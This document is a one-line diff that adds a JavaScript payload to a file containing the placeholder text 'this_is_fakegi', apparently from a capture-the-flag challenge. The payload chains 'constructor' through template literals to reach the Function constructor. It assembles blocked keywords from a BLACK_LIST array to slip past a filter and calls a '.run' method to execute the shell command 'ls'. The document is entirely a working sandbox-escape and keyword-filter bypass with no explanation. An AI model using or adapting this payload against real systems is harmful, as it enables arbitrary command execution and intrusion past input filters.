@@ -1,1 +1,2 @@
 this_is_fakegi
+``[`constructor`][`constructor`](`return ${BLACK_LIST[0]}[`run`]({cmd:[${BLACK_LIST[3]}ls${BLACK_LIST[3]}]})`)()
